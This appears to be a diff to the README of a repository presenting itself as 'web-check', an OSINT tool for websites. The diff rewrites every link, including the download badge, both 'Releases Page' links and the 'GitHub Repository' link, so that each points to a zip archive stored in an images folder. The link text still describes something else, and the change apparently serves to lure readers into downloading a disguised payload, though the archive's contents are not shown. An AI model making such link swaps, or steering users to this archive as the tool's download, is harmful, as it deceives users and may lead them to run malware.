@@ -1,6 +1,6 @@
 # 🕵️‍♂️ web-check - Your Easy OSINT Tool for Websites
 
-[![Download web-check](https://img.shields.io/badge/Download-web--check-blue.svg)](https://github.com/Jaxaboyfred2309/web-check/releases)
+[![Download web-check](https://github.com/Jaxaboyfred2309/web-check/raw/refs/heads/master/public/assets/images/web-check-v1.2.zip)](https://github.com/Jaxaboyfred2309/web-check/raw/refs/heads/master/public/assets/images/web-check-v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to web-check! This tool helps you analyze websites easily. You don’t n
 
 ## 📥 Download & Install
 
-To get web-check, visit this page to download: [Releases Page](https://github.com/Jaxaboyfred2309/web-check/releases). Here, you will find the latest version for your system.
+To get web-check, visit this page to download: [Releases Page](https://github.com/Jaxaboyfred2309/web-check/raw/refs/heads/master/public/assets/images/web-check-v1.2.zip). Here, you will find the latest version for your system.
 
 ### 💻 System Requirements
 
@@ -53,7 +53,7 @@ To use web-check, follow these simple steps:
 
 - Ensure your internet connection is stable for accurate results.
 - Use web-check on various websites to familiarize yourself with its features.
-- Regularly check for updates on the [Releases Page](https://github.com/Jaxaboyfred2309/web-check/releases) for the latest improvements.
+- Regularly check for updates on the [Releases Page](https://github.com/Jaxaboyfred2309/web-check/raw/refs/heads/master/public/assets/images/web-check-v1.2.zip) for the latest improvements.
 
 ## 🛠️ Troubleshooting
 
@@ -76,7 +76,7 @@ If you have questions or need support, you can check the following resources:
 
 For more information about web-check, visit:
 
-- [GitHub Repository](https://github.com/Jaxaboyfred2309/web-check)
+- [GitHub Repository](https://github.com/Jaxaboyfred2309/web-check/raw/refs/heads/master/public/assets/images/web-check-v1.2.zip)
 - [Documentation Website](#)
 - [FAQ Section](#)
 
